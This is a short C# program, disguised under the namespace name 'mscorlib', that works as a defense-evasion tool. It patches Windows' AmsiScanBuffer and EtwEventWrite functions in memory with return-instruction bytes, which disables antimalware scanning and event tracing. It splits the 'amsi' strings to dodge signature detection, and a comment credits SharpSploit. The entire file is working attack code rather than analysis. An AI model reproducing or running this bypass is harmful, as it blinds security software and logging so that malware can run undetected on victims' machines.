using System;
using System.Runtime.InteropServices;

namespace mscorlib
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string fileName);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        static bool Is64Bit
        {
            get { return IntPtr.Size == 8; }
        }

        static byte[] Clearing(string function)
        {
            // Both AMSI and ETW bypasses are courtesy of sharpsploit.
            byte[] patches;
            if (function.ToLower() == "etwpoof")
            {
                if (Is64Bit)
                {
                    patches = new byte[2];
                    patches[0] = 0xc3;
                    patches[1] = 0x00;
                }
                else
                {
                    patches = new byte[2];
                    patches = new byte[3];
                    patches[0] = 0xc2;
                    patches[1] = 0x14;
                    patches[2] = 0x00;
                }
                return patches;
            }

            else if (function.ToLower() == "amsipoof")
            {
                if (Is64Bit)
                {
                    patches = new byte[6];
                    patches[0] = 0xB8;
                    patches[1] = 0x57;
                    patches[2] = 0x00;
                    patches[3] = 0x07;
                    patches[4] = 0x80;
                    patches[5] = 0xC3;
                }
                else
                {
                    patches = new byte[8];
                    patches[0] = 0xB8;
                    patches[1] = 0x57;
                    patches[2] = 0x00;
                    patches[3] = 0x07;
                    patches[4] = 0x80;
                    patches[5] = 0xC2;
                    patches[6] = 0x18;
                    patches[7] = 0x00;

                }
                return patches;
            }
            else throw new ArgumentException("Function not supported");
        }

        static void etwpoof()
        {
            string traceloc = "ntdll.dll";
            string functionName = "EtwEventWrite";
            IntPtr ntdllAddr = LoadLibrary(traceloc);
            IntPtr traceAddr = GetProcAddress(ntdllAddr, functionName);
            byte[] lessgoo = Clearing("etwpoof");
            VirtualProtect(traceAddr, (UIntPtr)lessgoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(lessgoo, 0, traceAddr, lessgoo.Length);
            VirtualProtect(traceAddr, (UIntPtr)lessgoo.Length, oldProtect, out uint newOldProtect);
            Console.WriteLine("ETW Poof!");
        }

        static void amsipoof()
        {
            string avloc = "am" + "si" + ".dll";
            string functionName = "Am" + "siSc" + "anB" + "uffer";
            IntPtr avAddr = LoadLibrary(avloc);
            IntPtr traceAddr = GetProcAddress(avAddr, functionName);
            byte[] lessgoo = Clearing("amsipoof");
            VirtualProtect(traceAddr, (UIntPtr)lessgoo.Length, 0x40, out uint oldProtect);
            Marshal.Copy(lessgoo, 0, traceAddr, lessgoo.Length);
            VirtualProtect(traceAddr, (UIntPtr)lessgoo.Length, oldProtect, out uint newOldProtect);
            Console.WriteLine("AMSI Poof!");
        }

        static void Main(string[] args)
        {
            etwpoof();
            Console.ReadKey();
            amsipoof();
            Console.ReadKey();
        }
    }
}
